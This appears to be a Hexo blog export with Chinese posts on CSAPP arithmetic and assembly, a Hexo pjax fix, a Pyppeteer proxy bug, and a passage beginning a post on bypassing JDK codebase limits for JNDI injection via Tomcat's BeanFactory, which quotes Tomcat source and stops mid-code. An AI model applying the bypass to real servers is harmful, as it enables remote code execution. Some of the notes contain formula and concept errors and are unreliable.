    <title>深入理解计算机系统读书笔记（三）</title>
    <url>/archives/f9db7072.html</url>
    <content><![CDATA[<ul>
<li>无符号数的加法：当两个无符号数相加的时候可能发生溢出，如果0&lt;&#x3D;x,y&lt;2**w  w为字长，那么0&lt;&#x3D;x*y &lt;&#x3D; 2**w-2，这样结果的字长就可能膨胀到w+1位，当然如果0&lt;&#x3D;x*y&lt;&#x3D;2**w-1的时候是不会发生字长膨胀的，只有当2**w&lt;&#x3D;x*y&lt;&#x3D;2**-2时才会发生字长膨胀，也就是一个4位的数可能膨胀到5位，此时就发生了整数溢出。溢出的值发生最高位截断，比如9+12 &#x3D; 21，大于了4位无符号整数的最大值15，其结果肯定会发生溢出，我们知道21的5位二进制便是为10101，最高位丢弃后的结果为0101，转换为十进制就是5，注意到5&#x3D;21-2**4，那么是否具有普适规律？我们知道4位如果膨胀到5位那么就是发生了进位，增加了权重1*2**4 &#x3D; 16，相应的截断后就是减去16，看来该规律是具有普适性的。</li>
<li>无符号数加法溢出的检测：如果s&#x3D;x+y，s&lt;x或者x&lt;y那么则发生了溢出，原理为当s发生溢出后有等式s&#x3D;x+y-2**w w为字长，我们知道y肯定是小于为2**w的那么y-2**w则必定为负数，那么s&#x3D;x+（负数），结果s肯定小于x，同理可推导处s&lt;y，因此该方式可以作为检测的依据。</li>
<li>补码加法：同理补码加法同样可能发生溢出，不过其溢出可能有两个方向，即正溢出与负溢出。当-(2**(w-1)) &lt;&#x3D;x,y&lt;&#x3D;2**(w-1)-2时，可能发生溢出，当x+y&gt; &#x3D;2**(w-1)时发生正溢出，当x+y&lt;-2**(w-1)时发生负溢出，取中间时正常不会发生溢出，同样的道理当发生溢出是时产生了进位。那么当结果是正溢出时则把最高位的正权丢失了，于是结果为x+y-2**w，当发生负溢出的时候，相当于减去了负权，也就是加上正权，于是结果为x+y+2**w</li>
<li>部门加法溢出的判断：当两正数相加得到负数的时候、两负数相加得到正数的时候发生溢出。</li>
<li>加法逆元：无符号数的加法逆元，即求非，对于任意一个w位的无符号整数x，总有一个数-x满足-x+x &#x3D; 0。毫无疑问的当x为0的时候其加法逆元则为0，当x&gt;0时其加法逆元为2**w-x，当然对于无符号数来说是没有负数的那么怎样才能得出这个结论呢，我们使用2**-x+x &#x3D; 2<em><em>w，该数大于了w位无符号数的最大值将会发生溢出，其结果为2</em>*w-2</em>*w &#x3D; 0，刚好满足加法逆元的定义。对于有符号数求非，当x不是有符号数的最小值的时候，很明显其结果就为-x，当x为最小值的时候没有一个-x与其对应则不能简单的这样运算，不过当两个最小值相加时有x+x &#x3D; -2**(w-1)+(-2**(w-1)) &#x3D; -2**w此时讲发生负溢出，根据前面的攻势此时x+x&#x3D;-2**w+2**w&#x3D;0，也就是说无符号数最小值的加法逆元为其本身。</li>
<li>一个补码表示的数如何取非，有两种方式，第一种，对该数的位级表示每一位取补，然后讲结果+1，如4位补码-6的位级表示为1010，每一位取补为0101，转为整数为5，然后加1位6，为补码-6的非。如果是-8呢？同样的位级表示为1000，取反0111位7加1为8，问题来了我们知道4位补码的最小值为-8，其非应该为其本身即-8才对，这里算出来确实8，怎么回事？？我也不知道呢。。。。第二种方式对于一个非0的补码数来说，总能找到其最右边的1，那么我们只需对这个对左边的数取反就可以了，还是对于整数-6来说1010，运算后就是0110，转为十进制整数为6，即-6的非为6，那么对于-8来说呢，1000运算后变成了1000，还是-8，这个就正常了。。</li>
<li>无符号数的乘法：同样的对于0&lt;&#x3D;x,y&lt;&#x3D;2**(w-1)来说，x<em>y产生的结果可能发生溢出，其结果范围为0&lt;s&lt;&#x3D;2</em>*(2<em>w)-2</em><em>(w+1)+1，这可能需要2</em>w位来表示s，同样的计算结果将发生高位截断，高w位被丢弃只留下低w位，那么运算的结果则为x<em>y &#x3D; (x.y)mod 2</em>*w，怎么推导的呢？书上没写哦，不过我想也不难的，高位截断就是 减去(2**w+…+2**(2w-1))这个值模2**w为(0+2**1+….+2**w-1)，这个结果看着是不是很眼熟，这不就是w位整数的表示方法吗？这里观察到一个规律，一个w位的数发生了字长膨胀计算算术结果为s，那么截断后的值为s mod 2**w，这是因为膨胀的位的权重mod 2**w结果都为0,有因为位的最大值也不可能大于2**w，那么这部分将作为余数被保留，高位则全部被整除了。</li>
<li>有符号数的乘法，与无符号数的乘法规则是一样的，推导过程也是一样的。</li>
<li>补码乘法与有符号乘法的位级等价性证明：太他妈复杂了，首先我们有两个位级向量a与b，那么其无符号数表示未x &#x3D; B2U(a)与y &#x3D; B2U(b)，补码表示为w &#x3D; B2T(a)与z &#x3D; B2T(b)那么就有T2B(a<em>b) &#x3D; U2B(a</em>b)成立。在进行无符号数与补码转换时我们有公式x&#x3D;w+2**k	 ，现在有(x<em>y) mod 2**k &#x3D; ((w+2</em>*k)(z+2**k)) mod 2**k &#x3D; (w<em>z+(w+z)2</em>*k+2**(2<em>k)) mod 2</em>*k &#x3D; (w<em>z) mod 2</em>*k，即(x<em>y) mod 2</em>*k &#x3D;(w<em>z) mod 2</em>*k，根据补码乘法原则有w.z &#x3D; U2T(w<em>z mod 2</em>*k) 两边同时应用函数T2U化简后得到T2U(w.z) &#x3D; w<em>z mod 2</em>*k 那么上式转换为T2U(w.z) &#x3D; (w<em>z) mod 2</em>*k &#x3D; (x<em>y) mod 2</em>*k &#x3D; x.y，两边同时应用U2B为 U2B(T2U(w.z)) &#x3D; U2B(x.y)就是T2B(w.z)&#x3D;U2B(x.y)，到此证明完毕，无符号数与补码乘法有位级等价性质。举个例子对于3位无符号数5[101]其补码表示为-3 [101]，无符号数3[011] 其补码表示为3[011]，两个无符号数相乘3<em>5 &#x3D; 15产生了溢出，按照公式除以8取模为7[111]，两个补码相乘-3</em>3&#x3D;-9产生了溢出，按照截断原则除以8取模余-1[111]，可以看到两个结果虽然十进制表示结果不同但拥有相同的位级表示。</li>
<li>x 向左移动k位的推导过程，当然k不能大于等于w。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10f375e86f624938362e3be5689c52d7.png" alt="在这里插入图片描述"></li>
<li>因为直接计算整数的乘法相当慢，所有计算机采用了另一种方式，通过移位加加减法的方式来提升计算速度，通过生面的式子推导我们已经知道向左移位就是乘以2**k 同理向又移位就是除，那么我们就可以将乘法操作转换为移位和加减法操作了，如x<em>14，我们在计算的时候14&#x3D;2</em>*3+2**2+2**1，于是上面的式子变成了x&lt;&lt;3+x&lt;&lt;2+x&lt;&lt;1，如此便实现了乘法运算的转换。</li>
<li>对于乘法来说，无论是补码还会无符号数通过移位得到的结果总是满足上面的规律，如4位补码-5*2&#x3D;-10[10110]，产生了溢出截取最高位之后的值为 6[0110] 通过移位-5[1011] 之后为6[0110]，结果一致。</li>
<li>对于除法同样可以采用向右移位的方式，不过其情况更为复杂，对于无符号数来说简单的移位就可以搞定，但是对于有符号数则要复杂得多。不过还需要考虑的直接进行除法是会得到小数的，而移位操作是不会产生小数的，那么这个冲突怎么解决的呢？正的小数发生向下舍入，负的小数发生向上舍入。</li>
<li>无符号数的除法，因为除法运算会产生小数，在计算时我们需要进行舍入。现有w位表示的数x，如果有一个数k,取值范围为1&lt;&#x3D;k&lt;w，那么1~k位的数表示为u，k+1到w位的数表示为y，那么x可以表示为x&#x3D;u+y<em>2</em>*k 那么x&#x2F;2**k &#x3D; u&#x2F;2**k+y，我们知道u肯定是小于2**k的，不会发生整除，其作为余数被舍去，所以舍入之后有等式x&#x2F;2**k &#x3D; y，即k+1到w位的数，当我们将x右移k位，高k位填充0，低w-k位的值就是最开始k+1到w位的值。位计数从0开始。这就是除法移位的计算方法推导。比如4位无符号数5[0101]除以2结果为2，通过移位需要移动1位即[00101]最低位舍去得到2[0010]</li>
<li>有符号数的除法。对于有符号数在进行除法操作时因为移位会导致符号位为1时被填充为0，那么结果的符号就变化了，而我们知道除法运算是不是改变符号的，这与事实不符，所以简单的逻辑移位是不对的，这时候需要用到算术移位，当然了，补码正数的运算方法还是和无符号数一样的。所谓算术唯一就是右移的时候高位不是填充0而是填充1，如-5[1011]除以2得到-3，通过移位为[11011]舍去低位得到-3[1101]，这个推导过程我没看懂这儿就不写了。</li>
<li>浮点数的二进制表示3&#x2F;4&#x3D;1&#x2F;4+2&#x2F;4&#x3D;1&#x2F;4+1&#x2F;2&#x3D;2**(-1)+2**(-2) &#x3D; 0.11 ，不过这种方式不便于表示大数，数据较大的时候会导致存储数据消耗巨大的存储空间，所以有了IEEE标准的浮点数表示方法，对于单精度浮点数用32位表示1个符号位，8个阶码，23个位数位，数按进度浮点数用64位表示，一个符号位，11个阶码，52个尾数。符号位1表示负数0表示正数，阶码有三种格式中时不包含全是0与全是1的规格化值，一种是全是0的非规格话的值，另一种是全是1的无穷大的值。当使用规格化的值的时候，位级表示&#x3D;浮点数的指数尾数（阶码）+偏置值，这个偏置值对于单精度浮点数来说为127，对双精度来说为1023，所以对单精度来说最多可以表示的指数位为-126~127，双精度为-1022 ~ 1023。尾数这部分怎么计算的我还没看明白。对于特殊值的阶码来说，当小数位全为0的时候表示无求大，正无穷还是负无穷由符号位控制。对于非规格化阶码，其提供了0的表示方法，因为规格化的表示尾数必须大于1，则不可能表示0，同样的这种方式表示的0的符号由符号位控制也就是产生了正0与负0两种结果，这两种结果在有些情况下相等在有些情况下不相等。</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>深入理解计算机系统</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统读书笔记（四）</title>
    <url>/archives/4ef66917.html</url>
    <content><![CDATA[<ul>
<li>x86-64位寄存器含有16组64位通用目的寄存器，%rax,%bx %cx %dx %rsi %rdi %rbp %rsp %r8 %r9 ….%r15，其中特殊的%rsp存储栈指针的值，%rax为返回值。</li>
<li>汇编有两种架构，现在大多数编译器如GCC等使用的都是ATT架构的，另外微软与Intel的编译器使用的是Intel的架构，两者有细微的区别。</li>
<li>汇编指令后的为操作数，一遍指令都有一个或者多个操作数，操作数的值有三种来源，一种是立即数，一种是来自寄存器，一种是来自内存。</li>
<li>立即数的书写是$后直接跟正常的整数，如movb $0x45, %bl 操作数类型为立即数与寄存器</li>
<li>寄存器类型的操作数只能是1、2、4、8字节，这样是为了向后兼容，如8字节为64位的操作数对应64位寻址能力的系统，4字节则对应32位系统等等。如 movq %rax,%rdx 的操作数类型均为寄存器</li>
<li>对于操作数为内存类型的，有多种不同的寻址模式：<ul>
<li>立即数寻址—$0x54 </li>
<li>寄存器寻址—%rax</li>
<li>绝对寻址—–0x56</li>
<li>间接寻址—–(%rax)</li>
<li>基址+偏移量寻址—8(%rax)</li>
<li>变址寻址—(%rax,%rbx)</li>
<li>变址寻址—7(%rax,%rbx)</li>
<li>比例变址寻址—(,%rax,4)</li>
<li>比例变址寻址—7(,%rax,8)</li>
<li>比例变址寻址—(%rax,%rbx,1)</li>
<li>比例变址寻址—7(%rbx,%rax,2)</li>
<li>比例值只能为1,2，4,8</li>
</ul>
</li>
<li>数据传送指令：movb movw movl movq分别对应1，2,4，8字节的传送，有两个操作数，一个源操作数一个目的地址，如movq (%rbx),%rax 表示从寄存器%rbx中读取全部64位对应的内存地址的值存到寄存器%rax中，再比如movl $0x5495868383930205,-56(%rax)，表示将32立即数$0x5495868383930205 存到寄存器%rax中的值表示的内存地址-56字节的位置上。</li>
<li>movzbw movzbl movzwl movzbq movzwq，在较小的源值复制到较大的目的时运用零扩展使用这些指令，注意到这里少了movzlq,即双字扩展到4字，这是因为该方法可以通过movl自动实现，因为在写寄存器的时候凡是产生大于32位的值其寄存器高危都将被置于0，所以可以用movl提带movzlq，</li>
<li>movsbw movsbl movswl movsbq movswq movslq ctlq 在较小的源值复制到较大的目的时运用字符扩展使用这些指令，注意到这里多了一个ctlq与movslq，上面说了0扩展填充0刚好与32位置零吻合所以可以提到，这里使用符号扩展扩展的是最高位，可能为1，所以movslq不能省略。ctlq 专指将%eax中的内容移动到%rax中，与movslq %eaq,%rax等效</li>
<li>上面两组指令的目的操作数只能为寄存器地址，源操作数可以来自寄存器，立即数，内存。</li>
<li>这里有一个c语言编写的函数：<br>  long exchange(long *xp, long y)<br>  {<br>      long x &#x3D; *xp;<br>      *xp &#x3D; y<br>      return x<br>  }</li>
</ul>
<p>调用long 1 &#x3D; 5; exchange(&amp;a,8)，最后返回的值为5，这是一个怎样的过程呢，该段代码经过编译器编译后变成<br>		exchange:<br>			movq (%rdi),%rax<br>			movq %rsi, (%rdi)<br>			ret<br>解释：%rdi  存储 xp  %rsi 存储 y，首先调用xp的值对应的内存地址中的值赋值给x也就是5，然后将8赋值为xp对应的内存地址，也就是a指向的内存地址。最后返回%rax的值也就是x&#x3D;5,。更有这个是有a&#x3D;8，发生了数据交换。</p>
<ul>
<li><p>一道练习题,通过mov指令完成类型转换：操作数地址分别存在%rdi 与%rsi中<br>  char–&gt;int:<br>          movsbl (%rdi),%rax<br>          movl %eax,(%rsi)<br>  char–&gt; unsigned int<br>          movsbl (%rdi),%rax<br>          movl %eax,(%rsi)<br>  unsigned char  –&gt;  long<br>          movzbl (%rdi),%rax<br>          movq %rax,(%rsi)</p>
</li>
<li><p>压栈与弹栈：栈是向下增长的，较低的栈地址在下面，所以压栈就是对栈地址做减法，弹栈就是做加法。栈遵循的是后进先出的原则即 FILO，压栈使用指令pushq pushl pushw pushb，弹栈使用指令popq popl popw popb。压栈的时候首先将栈顶下移然后讲数据存储进去，如pushb $0x56 ,如果此时的栈顶位置是0x101，那么首先将栈顶向下移动1字节得到栈顶位置0x100，然后讲1字节的数据$0x56放进去，完成压栈操作。这个过程可以拆分成两步即 subn $1,%rsp     movb $0x56,(%rsp)，不过这样拆分将导致更大的运算量所以不被采用。弹栈的过程一样，直接将栈顶位置上移即可。即popb %rax 相当于 movb (%rsp), %rax addb $1,%rsp</p>
</li>
<li><p>加载有效地址：leaq leal leaw leab指令 只加载地址不加载值<br>  如leaq (%rdi,%rsi,4) %rax 表示讲%rdi+4*%rsi计算出的内存地址赋值给寄存器%rax，而不是获取内存地址对应的值。<br>  其和movq  (%rdi,%rsi,4) %rax 的结果明显不同，使用mov或获取到内存地址中的值赋值而寄存器%rax。<br>  利用这个特性可以用来进行简答的加法与乘法运算，如有这样一个C函数<br>  long scale(long x, long y, longz){<br>  long t &#x3D; x+4<em>y+12</em>z;<br>  return t<br>  }<br>  编译器编译后将变成：<br>  scale:<br>  leaq (%rdi, %rsi, 4), %rax   # x+4y<br>  leaq (%rdx, %rdx, 2), %rdx  # z+2z &#x3D; 3z<br>  leaq (%rax, %rdx, 4), %rax  # x+4y+4*(3z)&#x3D;x+4y*12z<br>  ret</p>
</li>
</ul>
<p>简直不要太神奇。。。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>深入理解计算机系统</tag>
      </tags>
  </entry>
  <entry>
    <title>解决hexo内嵌js无法加载问题</title>
    <url>/archives/7f771bb5.html</url>
    <content><![CDATA[<p>检查网站是否开启了<code>pjax</code><br>查看主题配置文件，搜索关键字<code>pjax</code><br>如果<code>pjax</code>的值为true，则证明开启了，此时若要使得内嵌<code>js</code>在每次访问时都能够执行在<code>js</code>标签上添加<code>data-pjax</code> 属性即可  </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script data-pjax type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">xxxx</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bug修复</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>pjax</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次Pyppeteer调试解决--Browser closed unexpectedly--的问题</title>
    <url>/archives/ef2b93c5.html</url>
    <content><![CDATA[<p>事情是酱婶儿的：<br>我曾经是个靓仔，可后来我妈来了…….<br>她告诉我过年想抱孙子…..<br>我说，啊，这…….<br>我不做靓仔很多年了……<br>这种事去找幺娃子就好了……….<br>emo……..</p>
<span id="more"></span>


<p>我写了一个脚本监控先知、freebuf以及安全客论坛上面的文章更新，因为先知恶心的反爬虫机制所以使用了Chromium无头浏览器配合pyppeteer来进行监控，前两天运行的很丝滑，但今天运行的时候发现界面一直卡住不动，就像下面这样子：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b9a60352e0de708de86823eac1feddae.png" alt="在这里插入图片描述"><br>这能认吗，这不能忍。于是我：<br>找到了万能的小冰，小冰不知所措，呸，垃圾；<br>找到了度娘，度娘不知所措，呸，垃圾；<br>找到了谷哥，谷哥不知所措，呸，垃圾；<br>还有什么垃圾尽管放马过来？<br>在座的都是垃圾。<br>忍无可忍之下我只好艰难得爬起来尝试着定位问题在哪。<br>通过不断的print，定位到了这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d8c29df09f7bf126443dfc2902b1e9fb.png" alt="在这里插入图片描述"><br>只打印4，2让你吃了？<br>30秒后。。。。。报错了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8eaedcd35755b6a89156748de6f54a5d.png" alt="在这里插入图片描述"><br>浏览器不知所措：<br>果断打断点，进到lunch方法里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/69aa61a0c95bfdd6ff5fd4adfd475269.png" alt="在这里插入图片描述"><br>Launcher类的launch方法，先对Launcher类进行初始化：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/56a46c6eb13a64c10ba32e719c249fe5.png" alt="在这里插入图片描述"><br>没啥屌用，不过我还是看了好久，怕错过什么，我一步一步看的，还是有收获，然后调用launch方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/573dab837eb35425fa50c1944a4fc1ac.png" alt="在这里插入图片描述"><br>注意Popen方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b1734163dcbcf28653a960faa0fb121e.png" alt="在这里插入图片描述"><br>此处执行系统命令，打开了chromium浏览器：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c0669cb626fdf0f2b5859a07c21c5b3d.png" alt="在这里插入图片描述"><br>然后当我单步到上图红框执行完之后pycharm就停住了，30s后系统crash了，所以问题就出在上图断点处，进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0e378c98e7a2052e00b3432fbef52fd6.png" alt="在这里插入图片描述"><br>这里调用urlopen方法访问了<code>http://127.0.0.1:64443/json/version</code>，然后当我再往下的时候，就进入了except里面，证明里面出错了，大概率是url请求出错，所以我在浏览器访问了一下这个资源：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/93143ec440760a0710a12020fdd9616a.png" alt="在这里插入图片描述"><br>很丝滑，讲道理不会报错才对，不信邪的我又在其他文件用urlopen打开了一下这个资源：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5b786080484a93e6ecdcd5cd2a227f19.png" alt="在这里插入图片描述"><br>bingo!!报错了，但是为什么了，我又换了request请求了一次：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/79e0fc1ee4fc3bf1dc874c4d0e005db1.png" alt="在这里插入图片描述"><br>又报错了，而且提供了我们更多的信息，ProxyError。这尼玛，急的我立马去查了下我所有的代理发现都是关着的…..<br>裂了，后来上网搜了搜代理可以通过命令行配置，可以在高级系统设置里面看到有没有一个http_proxy的字段。我一看，尼玛，还真有：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a6875f0b92a546027f4d3405d8294d4a.png" alt="在这里插入图片描述"><br>他娘的，果断删除，重启pycharm运行：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9ab74e0be63933b527fcef27aba51d6d.png" alt="在这里插入图片描述"><br>丝滑，打完收工！！！<br>不过这个代理他么哪来的呢？？<br>想起来了，昨晚复现GLPI的一个漏洞安装环境要安装PHP的composer，这个垃圾玩意儿当时让我设置个代理，还不能取消。最后环境也没有打起来，简直太坑了。</p>
]]></content>
      <categories>
        <category>bug修复</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>pyppeteer</tag>
      </tags>
  </entry>
  <entry>
    <title>通过Tomcat BeanFactory 绕过高版本JDK CodeBase限制实现JNDI注入</title>
    <url>/archives/42623881.html</url>
    <content><![CDATA[<p>上一篇文章我们讨论了通过Reference方法实现远程恶意类的自动加载，最终提供了一种使用本地类绕过truseURLCodeBase的方法，今天我们就来找到这样一个类，我们知道我们的远程恶意类要满足的两个条件是，首先要实现ObjectFactory接口，这是充分必要条件，还有一个充分不必要条件就是要重写javax.naming.spi.ObjectFactory方法。因为本地类的内容是我们不可控的，也就是不能去自己写静态代码块、实例代码块与无参构造方法，那么我们今天要找的本地类也就必须要实现getObjectInstance方法且有可利用的点，我们在Tomcat的源码中找到了这样一个方法，这里提供一个寻找某一个类实现类的快捷键，我们在IDEA中安Ctrl+H就可以看到所有实现了这个接口的类了。</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/16da0a68c627fd17e0809e0d9e7b92ac.png" alt="在这里插入图片描述"><br>这里我们之间看org.apache.naming.factory.BeanFactory#getObjectInstance方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                    Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span></span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                        (<span class="string">&quot;Class not found: &quot;</span> + beanClassName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">                PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line"></span><br><span class="line">                <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.newInstance();</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Look for properties with explicitly configured setter */</span></span><br><span class="line">                <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">                Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                String value;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                    value = (String)ra.getContent();</span><br><span class="line">                    Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">                    paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line">                    String setterName;</span><br><span class="line">                    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Items are given as comma separated list */</span></span><br><span class="line">                    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">                        param = param.trim();</span><br><span class="line">                        <span class="comment">/* A single item can either be of the form name=method</span></span><br><span class="line"><span class="comment">                         * or just a property name (and we will use a standard</span></span><br><span class="line"><span class="comment">                         * setter) */</span></span><br><span class="line">                        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                                         param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                                         param.substring(<span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            forced.put(param,</span><br><span class="line">                                       beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchMethodException|SecurityException ex) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                (<span class="string">&quot;Forced String setter &quot;</span> + setterName +</span><br><span class="line">                                 <span class="string">&quot; not found for property &quot;</span> + param);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">                    ra = e.nextElement();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;scope&quot;</span>) || propName.equals(<span class="string">&quot;auth&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;forceString&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;singleton&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">                    Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Shortcut for properties with explicitly configured setter */</span></span><br><span class="line">                    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">                    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            method.invoke(bean, valueArray);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IllegalAccessException|</span><br><span class="line">                                 IllegalArgumentException|</span><br><span class="line">                                 InvocationTargetException ex) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                (<span class="string">&quot;Forced String setter &quot;</span> + method.getName() +</span><br><span class="line">                                 <span class="string">&quot; threw exception for property &quot;</span> + propName);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;pda.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (pda[i].getName().equals(propName)) &#123;</span><br><span class="line"></span><br><span class="line">                            Class&lt;?&gt; propType = pda[i].getPropertyType();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (propType.equals(String.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Character.class)</span><br><span class="line">                                       || propType.equals(<span class="type">char</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] =</span><br><span class="line">                                    Character.valueOf(value.charAt(<span class="number">0</span>));</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Byte.class)</span><br><span class="line">                                       || propType.equals(<span class="type">byte</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Byte.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Short.class)</span><br><span class="line">                                       || propType.equals(<span class="type">short</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Short.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Integer.class)</span><br><span class="line">                                       || propType.equals(<span class="type">int</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Integer.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Long.class)</span><br><span class="line">                                       || propType.equals(<span class="type">long</span>.class)) &#123;</span><br><span 